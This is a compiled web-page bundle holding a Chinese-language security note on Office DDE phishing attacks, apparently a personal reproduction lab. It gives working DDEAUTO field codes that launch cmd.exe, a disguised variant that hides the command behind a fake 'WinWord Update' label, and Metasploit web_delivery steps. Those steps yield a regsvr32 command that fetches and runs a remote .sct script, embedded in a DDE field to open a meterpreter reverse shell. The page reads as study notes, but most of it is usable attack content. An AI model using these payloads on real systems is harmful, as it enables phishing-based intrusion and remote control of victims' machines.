import{_ as l}from"./plugin-vue_export-helper-DlAUqK2U.js";import{r as o,o as p,c as r,a as e,d as n,b as s,e as a}from"./app-BT-bWAve.js";const i={},c=e("h1",{id:"dde",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#dde"},[e("span",null,"DDE")])],-1),d=e("p",null,"环境: Win7 + Office 2016",-1),u={href:"https://msdn.itellyou.cn/?ang=2h-cn",target:"_blank",rel:"noopener noreferrer"},m=e("li",null,[e("p",null,[n("Office 2016: "),e("code",null,"ed2k://|file|cn_office_professional_plus_2016_x86_x64_dvd_6969182.iso|2588266496|27EEA4FE4BB13CD0ECCDFC24167F9E01|/")])],-1),g=e("p",null,"Win7:",-1),h={href:"https://next.itellyou.cn/Original/#cbp=Product?ID=6f677346-0a09-43fa-b60d-e878ed7625a0",target:"_blank",rel:"noopener noreferrer"},f={href:"https://cloud.tencent.com/developer/article/1816083",target:"_blank",rel:"noopener noreferrer"},_=a('<p>DDE (Dynamic Data Exchange) 是一种用于在Windows应用程序之间交换数据的协议</p><p>攻击者可以利用 DDE 通过自定义字段插入到Word或Excel文档中，用于执行恶意代码</p><hr><p>当用户打开包含DDE字段的文档时，Office应用程序会显示两个警告：</p><ol><li><strong>第一个警告</strong>：告知文档包含指向其他文件的链接。</li><li><strong>第二个警告</strong>：告知将打开远程命令提示符。</li></ol><p>如果用户忽略警告并允许操作，恶意命令将被执行，导致系统被攻击</p><hr><p>例如: 创建一个文档 <code>DDE.docx</code>, 打开后使用 <code>Ctrl+F9(或者选中&quot;插入&quot;-&quot;文件部件&quot;-&quot;域&quot;, 选中第一个 = (Formula) 然后右键切换域代码来编辑代码)</code></p><hr><h2 id="弹计算器" tabindex="-1"><a class="header-anchor" href="#弹计算器"><span>弹计算器</span></a></h2>',10),D={href:"https://cloud.tencent.com/developer/article/1816083",target:"_blank",rel:"noopener noreferrer"},k=a(`<p>以打开计算器为例, 在域代码中输入如下内容</p><div class="language-JavaScript line-numbers-mode" data-ext="JavaScript" data-title="JavaScript"><pre class="language-JavaScript"><code>DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe &quot;/k calc.exe&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406061623809.png" alt="image-20240606103628125"></p><p>保存后重新打开即可触发域代码执行</p><hr><blockquote><p>在 Office365 和 Office 2013 的 Word 上都没复现出来,都只有如下第一条警告, 然后就没有动静了</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202405171532647.png" alt="image-20240517153248330"></p><hr><p>后续在 Win7+Office2016 成功执行了 DDE</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406061623666.png" alt="image-20240606103518902"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406061623998.png" alt="image-20240606103531060"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406061623404.png" alt="image-20240606103541298"></p></blockquote><p>也可以伪装一下</p>`,7),b={href:"https://blog.csdn.net/tempulcc/article/details/108471488",target:"_blank",rel:"noopener noreferrer"},v=a(`<div class="language-javascript line-numbers-mode" data-ext="js" data-title="js"><pre class="language-javascript"><code><span class="token constant">DDEAUTO</span> <span class="token constant">C</span><span class="token operator">:</span>\\\\Programs\\\\Office\\\\Updates\\\\<span class="token constant">WINWORD</span><span class="token punctuation">.</span>exe<span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>Windows\\\\System32\\\\cmd<span class="token punctuation">.</span>exe <span class="token string">&quot;WinWord Update                                  /k calc.exe&quot;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><blockquote><p>PS: WinWord Update 和 <code>/k</code> 之间多加些空格, 否则效果不是很好:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406061811150.png" alt="image-20240606181142069"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406061812566.png" alt="image-20240606181228410"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406061812069.png" alt="image-20240606181240958"></p></blockquote><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406061818175.png" alt="image-20240606181847082"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406061818994.png" alt="image-20240606181815913"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406061818028.png" alt="image-20240606181828940"></p><hr><h2 id="反弹shell" tabindex="-1"><a class="header-anchor" href="#反弹shell"><span>反弹Shell</span></a></h2><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code>msf <span class="token operator">&gt;</span> use exploit/multi/script/web_delivery
msf <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> target <span class="token number">3</span>
msf <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> payload windows/meterpreter/reverse_tcp_uuid
msf <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> lhost <span class="token punctuation">[</span>msf主机要监听的本地ip地址<span class="token punctuation">]</span>
msf <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> lport <span class="token punctuation">[</span>msf主机要监听的本地端口<span class="token punctuation">]</span>
msf exploit<span class="token punctuation">(</span>multi/script/web_delivery<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit <span class="token parameter variable">-j</span> 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Exploit running as background job <span class="token number">0</span>.
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><p><code>target 3 -&gt; Regsvr32</code></p><p><code>regsvr32</code> 是 Windows 的一个命令行工具, 用于在 Windows 注册表中注册和注销 COM（Component Object Model）对象。这些对象通常是 DLL（动态链接库）或 OCX（ActiveX 控件）文件。注册这些文件允许它们被其他程序调用和使用。</p></li><li><p><code>windows/meterpreter/reverse_tcp_uuid</code>: 用于在目标 Windows 系统上建立一个反向连接的 Meterpreter 会话</p><p>与 <code>windows/meterpreter/reverse_tcp</code> 类似，但它包含了 UUID（通用唯一标识符）的支持，这有助于在目标系统上运行多个实例时进行区分。这在一些复杂的攻击场景中非常有用，可以更好地管理和跟踪不同的会话。</p></li><li><p><code>exploit -j</code>: 启动一个漏洞利用模块并将其作为后台作业（job）运行</p><p><code>-j</code> 表示以作业的方式在后台运行，这意味着漏洞利用模块不会阻塞当前的控制台，允许用户在当前会话中执行其他命令或操作</p></li></ul><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406061623460.png" alt="image-20240606105827774"></p><p>得到上线命令:</p><div class="language-cmd line-numbers-mode" data-ext="cmd" data-title="cmd"><pre class="language-cmd"><code>regsvr32 /s /n /u /i:http://100.1.1.131:8080/pakhnAAjLe0wl.sct scrobj.dll
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ul><li><p><strong>/s</strong>：静默模式，执行过程中不显示任何消息框</p></li><li><p><strong>/n</strong>：不用 <code>DllRegisterServer</code>，而是使用 <code>DllInstall</code> 方法</p></li><li><p><strong>/u</strong>：卸载模式，与 <code>/i</code> 参数一起使用时，会调用 <code>DllInstall</code> 方法以卸载而不是安装</p></li><li><p><strong>/i:http://100.1.1.131:8080/pakhnAAjLe0wl.sct</strong>：指定传递给 <code>DllInstall</code> 方法的参数</p><p>这里是一个远程 URL，指向一个 <code>.sct</code> 脚本文件，<code>regsvr32</code> 会下载并执行它</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406061623428.png" alt="image-20240606133303334"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406061623821.png" alt="image-20240606133342964"></p><p>具体来说是调 WScript 调 Powershell 执行编码了的命令; 解码后的命令为:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406061623227.png" alt="image-20240606143717556"></p><p>最终还是回到下载远程字符串命令并执行, 具体命令为:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406061623408.png" alt="image-20240606144027647"></p><p>具体就不往后解了, 还套了好几层, 等后续做个 Powershell 解混淆的专项研究, 收集和编写一些可用工具再看, 人力解混淆太耗时间了</p></li><li><p><strong>scrobj.dll</strong>：指定要使用的 DLL 文件，这里是 <code>scrobj.dll</code>, 全称为 &quot;Script Object Model DLL&quot;, 是 Windows 脚本宿主（Windows Script Host，简称 WSH）的一部分, 提供了运行和管理脚本的功能</p><p>WSH 支持多种脚本语言，如 VBScript 和 JScript，允许用户编写和执行脚本来自动化任务</p></li></ul><hr><p>得到的反弹代码是:</p><div class="language-cmd line-numbers-mode" data-ext="cmd" data-title="cmd"><pre class="language-cmd"><code>regsvr32 /s /n /u /i:http://100.1.1.131:8080/pakhnAAjLe0wl.sct scrobj.dll
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>写成 DDE 就是</p><div class="language-javascript line-numbers-mode" data-ext="js" data-title="js"><pre class="language-javascript"><code><span class="token constant">DDEAUTO</span> <span class="token literal-property property">c</span><span class="token operator">:</span>\\\\windows\\\\system32\\\\cmd<span class="token punctuation">.</span>exe <span class="token string">&quot;/k regsvr32 /s /n /u /i:http://100.1.1.131:8080/pakhnAAjLe0wl.sct scrobj.dll&quot;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406061623511.png" alt="image-20240606152651583"></p><p>保存后重新打开:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406061623626.png" alt="image-20240606152745928"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406061624209.png" alt="image-20240606152808558"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406061624930.png" alt="image-20240606152851391"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406061758785.png" alt="image-20240606175736169"></p><hr><h2 id="相关链接" tabindex="-1"><a class="header-anchor" href="#相关链接"><span>相关链接</span></a></h2>`,26),y={href:"https://cloud.tencent.com/developer/article/1816083",target:"_blank",rel:"noopener noreferrer"},E={href:"https://zhuanlan.zhihu.com/p/32103256",target:"_blank",rel:"noopener noreferrer"},x={href:"https://cloud.tencent.com/developer/article/1917641",target:"_blank",rel:"noopener noreferrer"},O={href:"https://blog.csdn.net/weixin_45575473/article/details/115894657",target:"_blank",rel:"noopener noreferrer"},N={href:"https://www.freebuf.com/articles/network/317116.html",target:"_blank",rel:"noopener noreferrer"},w={href:"https://blog.csdn.net/tempulcc/article/details/108471488",target:"_blank",rel:"noopener noreferrer"},q={href:"https://zhuanlan.zhihu.com/p/32103256",target:"_blank",rel:"noopener noreferrer"},W={href:"https://xz.aliyun.com/t/10339?time__1311=Cqjx2QD%3DiteWqGNDQimOgbtDtt0QtDReOYD",target:"_blank",rel:"noopener noreferrer"},j={href:"https://github.com/SecWiki/office-exploits/tree/master/DDEAUTO",target:"_blank",rel:"noopener noreferrer"},S=e("hr",null,null,-1);function C(B,A){const t=o("ExternalLinkIcon");return p(),r("div",null,[c,e("blockquote",null,[d,e("p",null,[n("可以在 "),e("a",u,[n("MSDN, 我告诉你 - 做一个安静的工具站 (itellyou.cn)"),s(t)]),n(" 找对应的镜像")]),e("ul",null,[m,e("li",null,[g,e("p",null,[e("a",h,[n("原版软件 (itellyou.cn)"),s(t)])])])])]),e("blockquote",null,[e("p",null,[e("a",f,[n("鱼叉钓鱼：利用 Office 文档进行 DDE 攻击-腾讯云开发者社区-腾讯云 (tencent.com)"),s(t)])])]),_,e("blockquote",null,[e("p",null,[e("a",D,[n("鱼叉钓鱼：利用 Office 文档进行 DDE 攻击-腾讯云开发者社区-腾讯云 (tencent.com)"),s(t)])])]),k,e("blockquote",null,[e("p",null,[e("a",b,[n("谨防钓鱼——OFFICE DDE复现_execl dde漏洞 复现-CSDN博客"),s(t)])])]),v,e("ul",null,[e("li",null,[e("a",y,[n("鱼叉钓鱼：利用 Office 文档进行 DDE 攻击-腾讯云开发者社区-腾讯云 (tencent.com)"),s(t)])]),e("li",null,[e("a",E,[n("钓鱼攻击：Office DDE 漏洞复现笔记 - 知乎 (zhihu.com)"),s(t)])]),e("li",null,[e("a",x,[n("干货 | Office文档钓鱼的实战和免杀技巧-腾讯云开发者社区-腾讯云 (tencent.com)"),s(t)])]),e("li",null,[e("a",O,[n("鱼叉钓鱼：利用 Office 文档进行 DDE 攻击_dde攻击-CSDN博客"),s(t)])]),e("li",null,[e("a",N,[n("wps和office宏钓鱼从认识到免杀 - FreeBuf网络安全行业门户"),s(t)])]),e("li",null,[e("a",w,[n("谨防钓鱼——OFFICE DDE复现-CSDN博客"),s(t)])]),e("li",null,[e("a",q,[n("钓鱼攻击：Office DDE 漏洞复现笔记 - 知乎 (zhihu.com)"),s(t)])]),e("li",null,[e("a",W,[n("常见钓鱼招式 - 先知社区 (aliyun.com)"),s(t)])]),e("li",null,[e("a",j,[n("office-exploits/DDEAUTO at master · SecWiki/office-exploits · GitHub"),s(t)])])]),S])}const I=l(i,[["render",C],["__file","index.html.vue"]]),U=JSON.parse('{"path":"/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/DDE/","title":"DDE","lang":"zh-CN","frontmatter":{},"headers":[{"level":2,"title":"弹计算器","slug":"弹计算器","link":"#弹计算器","children":[]},{"level":2,"title":"反弹Shell","slug":"反弹shell","link":"#反弹shell","children":[]},{"level":2,"title":"相关链接","slug":"相关链接","link":"#相关链接","children":[]}],"git":{"createdTime":1716951363000,"updatedTime":1720695646000,"contributors":[{"name":"233","email":"ayusummer233@gmail.com","commits":5}]},"readingTime":{"minutes":4.53,"words":1360},"filePathRelative":"网络安全/钓鱼/钓鱼附件/Office/DDE/index.md","localizedDate":"2024年5月29日","excerpt":"\\n<blockquote>\\n<p>环境: Win7 + Office 2016</p>\\n<p>可以在 <a href=\\"https://msdn.itellyou.cn/?ang=2h-cn\\" target=\\"_blank\\" rel=\\"noopener noreferrer\\">MSDN, 我告诉你 - 做一个安静的工具站 (itellyou.cn)</a> 找对应的镜像</p>\\n<ul>\\n<li>\\n<p>Office 2016: <code>ed2k://|file|cn_office_professional_plus_2016_x86_x64_dvd_6969182.iso|2588266496|27EEA4FE4BB13CD0ECCDFC24167F9E01|/</code></p>\\n</li>\\n<li>\\n<p>Win7:</p>\\n<p><a href=\\"https://next.itellyou.cn/Original/#cbp=Product?ID=6f677346-0a09-43fa-b60d-e878ed7625a0\\" target=\\"_blank\\" rel=\\"noopener noreferrer\\">原版软件 (itellyou.cn)</a></p>\\n</li>\\n</ul>\\n</blockquote>"}');export{I as comp,U as data};
